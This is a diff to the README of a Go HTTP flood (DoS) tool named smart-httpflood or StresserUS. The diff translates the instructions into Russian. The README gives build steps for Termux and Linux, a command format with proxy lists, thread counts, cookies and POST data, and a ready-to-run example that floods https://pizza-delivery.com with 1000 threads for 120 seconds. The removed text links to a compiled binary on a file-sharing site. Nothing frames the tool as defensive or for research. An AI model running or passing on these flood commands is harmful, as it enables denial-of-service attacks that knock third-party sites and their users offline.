@@ -1,27 +1,29 @@
 # smart-httpflood
-Golgang smart http flood
-
+Простой http флуддер(DoS) на Go
 
 This script supports HTTP Version, Cookie and Post Data.
+<h4>Поддерживает:</h4>
+HTTP, куки, POST запросы
+Установка:
+Зависит от вашей платформы. Поддерживает Termux и Linux
+<b>Termux:</b>
+<code>pkg install golang</code>
 
-Installation:
+<b>Manjaro Linux(Arch дистры):</b>
+<code>sudo pacman -S go</code>
 
-apt install snapd
+<b>Kali Linux(Debian дистры, если что Ubuntu к ним относится):</b>
+<code>sudo apt install golang</code>
 
-snap install go --classic
+Далее для всех платформ одинаковые команды:
+<code>git clone https://github.com/ret7020/smart-httpflood/</code>
+<code>cd smart-httpflood</code>
+<code>go build</code>
 
-go build
+<h4>Использование</h4>
 
-Link for compiled: https://anonfiles.com/HcO577T7u6/StresserUS
+<b>Формат команды:</b>
+<code>./StresserUS version=<version> host=<host> domain=<host header> limit=<rs-ip> time=<time> list=<proxies.txt> threads=<threads> mode=GET/POST cookie=<ddos=true> data=<post=true></code>
 
-
-Usage:
-
-
-./StresserUS version=<version> host=<host> domain=<host header> limit=<rs-ip> time=<time> list=<proxies.txt> threads=<threads> mode=GET/POST cookie=<ddos=true> data=<post=true>
-
-
-Eexample:
-
-
-./StresserUS version=2 host=https://pizza-delivery.com limit=64 time=120 list=proxy.txt threads=1000 mode=GET
+  Пример команды:
+ <code>./StresserUS version=2 host=https://pizza-delivery.com limit=64 time=120 list=proxy.txt threads=1000 mode=GET</code>
